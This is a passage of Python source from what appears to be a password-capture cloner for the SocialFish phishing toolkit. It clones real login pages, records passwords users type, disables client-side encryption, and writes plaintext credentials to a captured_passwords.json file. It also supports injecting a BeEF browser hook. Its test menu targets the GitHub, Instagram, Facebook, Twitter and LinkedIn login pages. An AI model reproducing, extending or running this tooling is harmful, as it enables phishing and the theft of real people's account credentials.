            for subdir in ['css', 'js', 'images', 'fonts', 'assets']:
                (output_dir / subdir).mkdir(exist_ok=True)
            
            logger.info(f"📁 Output directory: {output_dir}")
            return output_dir
            
        except Exception as e:
            logger.error(f"❌ Failed to create output directory: {e}")
            return None
    
    async def _get_page_content_with_password_capture(self, url: str) -> Optional[str]:
        """Get page content with PASSWORD CAPTURE enabled"""
        # Try browser rendering first with password capture
        if self.browser_manager.driver:
            content = await self.browser_manager.render_page(url)
            if content:
                # Try to capture any passwords that were entered during rendering
                captured_data = self.browser_manager.get_captured_passwords()
                if captured_data:
                    logger.info(f"🔑 Password data captured during rendering: {len(captured_data.get('passwords', []))} passwords")
                return content
        
        # Fallback to HTTP request (no password capture possible)
        if self.resource_manager.session_pool:
            session = self.resource_manager.session_pool[0]
            try:
                async with session.get(url) as response:
                    if response.status == 200:
                        # CRITICAL FIX: aiohttp automatically decompresses
                        content = await response.read()
                        
                        # Decode text for HTML content only (no manual decompression needed)
                        for encoding in ['utf-8', 'latin-1', 'iso-8859-1']:
                            try:
                                return content.decode(encoding)
                            except UnicodeDecodeError:
                                continue
                        
                        return content.decode('utf-8', errors='ignore')
            except Exception as e:
                logger.error(f"HTTP request failed: {e}")
        
        return None
    
    async def _save_metadata_with_password_info(self, url: str, output_dir: Path, start_time: float):
        """Save cloning metadata with PASSWORD CAPTURE information"""
        metadata = {
            'url': url,
            'timestamp': time.time(),
            'duration': time.time() - start_time,
            'stats': self.resource_manager.stats,
            'password_capture_enabled': self.config.capture_passwords_plaintext,
            'password_capture_sessions': len(self.browser_manager.captured_passwords),
            'socialfish_version': '2.0_password_capture_enhanced'
        }
        
        async with aiofiles.open(output_dir / 'metadata.json', 'w') as f:
            await f.write(json.dumps(metadata, indent=2))
        
        # Save captured passwords separately if any
        if self.browser_manager.captured_passwords and self.config.save_captured_passwords:
            password_data = {
                'capture_timestamp': time.time(),
                'target_url': url,
                'captured_sessions': self.browser_manager.captured_passwords
            }
            async with aiofiles.open(output_dir / 'captured_passwords.json', 'w') as f:
                await f.write(json.dumps(password_data, indent=2))
            logger.info(f"🔑 Saved {len(self.browser_manager.captured_passwords)} password capture sessions")
    
    async def _cleanup(self):
        """Cleanup resources"""
        await self.resource_manager.cleanup()
        self.browser_manager.cleanup()

# SocialFish Integration Functions
def sync_wrapper(coro):
    """Wrapper to run async function in sync context"""
    @wraps(coro)
    def wrapper(*args, **kwargs):
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        
        try:
            if loop.is_running():
                # If loop is already running, use thread
                import concurrent.futures
                with concurrent.futures.ThreadPoolExecutor() as executor:
                    future = executor.submit(asyncio.run, coro(*args, **kwargs))
                    return future.result()
            else:
                return loop.run_until_complete(coro(*args, **kwargs))
        except Exception as e:
            logger.error(f"Sync wrapper error: {e}")
            return False
    
    return wrapper

# Main SocialFish compatible function with PASSWORD CAPTURE
@sync_wrapper
async def clone_async(url: str, user_agent: str, beef: str) -> bool:
    """Async clone function for SocialFish with PASSWORD CAPTURE"""
    beef_enabled = beef.lower() == 'yes'
    
    config = SocialFishConfig()
    # Enable password capture by default
    config.capture_passwords_plaintext = True
    config.disable_client_encryption = True
    config.save_captured_passwords = True
    
    cloner = SocialFishCloner(config)
    
    return await cloner.clone_website_async(url, user_agent, beef_enabled)

# SocialFish compatible clone function (synchronous interface) with PASSWORD CAPTURE
def clone(url: str, user_agent: str, beef: str) -> bool:
    """
    SocialFish compatible clone function with PASSWORD CAPTURE
    
    Args:
        url: Target URL to clone
        user_agent: User agent string from request
        beef: 'yes' or 'no' for BeEF hook injection
    
    Returns:
        bool: True if cloning successful, False otherwise
    """
    try:
        logger.info(f"🐟 SocialFish PASSWORD CAPTURE Enhanced Clone Request: {url}")
        logger.info(f"👤 User Agent: {user_agent[:50]}...")
        logger.info(f"🥩 BeEF Hook: {beef}")
        logger.info(f"🔑 Password Capture: ENABLED")
        
        # Call async function with sync wrapper
        result = clone_async(url, user_agent, beef)
        
        if result:
            logger.info("✅ SocialFish PASSWORD CAPTURE clone completed successfully")
        else:
            logger.error("❌ SocialFish PASSWORD CAPTURE clone failed")
        
        return result
        
    except Exception as e:
        logger.error(f"❌ SocialFish PASSWORD CAPTURE clone error: {e}")
        return False

# Test function for universal usage
if __name__ == "__main__":
    test_sites = [
        ("https://github.com/login", "GitHub"),
        ("https://www.instagram.com/", "Instagram"),
        ("https://www.facebook.com/", "Facebook"),
        ("https://twitter.com/", "Twitter"),
        ("https://www.linkedin.com/", "LinkedIn")
    ]
    
    test_user_agent = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
    
    print("🧪 Testing SocialFish PASSWORD CAPTURE cloner...")
    print("Select a site to test:")
    for i, (url, name) in enumerate(test_sites, 1):
        print(f"{i}. {name} ({url})")
    
    try:
        choice = int(input("Enter choice (1-5): ")) - 1
        if 0 <= choice < len(test_sites):
            test_url, site_name = test_sites[choice]
            print(f"🚀 Testing {site_name} with PASSWORD CAPTURE...")
            result = clone(test_url, test_user_agent, "no")
            
            if result:
                print(f"🎉 {site_name} PASSWORD CAPTURE clone completed successfully!")
                print("🔑 Check output directory for captured_passwords.json")
            else:
                print(f"❌ {site_name} PASSWORD CAPTURE clone failed!")
        else:
            # Default test
            test_url = test_sites[0][0]
            print(f"🚀 Running default test: {test_sites[0][1]} with PASSWORD CAPTURE...")
            result = clone(test_url, test_user_agent, "no")
            
            if result:
                print("🎉 PASSWORD CAPTURE test completed successfully!")
                print("🔑 Check logs and output for captured password data")
            else:
                print("❌ PASSWORD CAPTURE test failed!")
    except (ValueError, KeyboardInterrupt):
        # Default test
        test_url = test_sites[0][0]
        print(f"🚀 Running default test: {test_sites[0][1]} with PASSWORD CAPTURE...")
        result = clone(test_url, test_user_agent, "no")
        
        if result:
            print("🎉 PASSWORD CAPTURE test completed successfully!")
            print("🔑 Check logs and output for captured password data")
        else:
            print("❌ PASSWORD CAPTURE test failed!")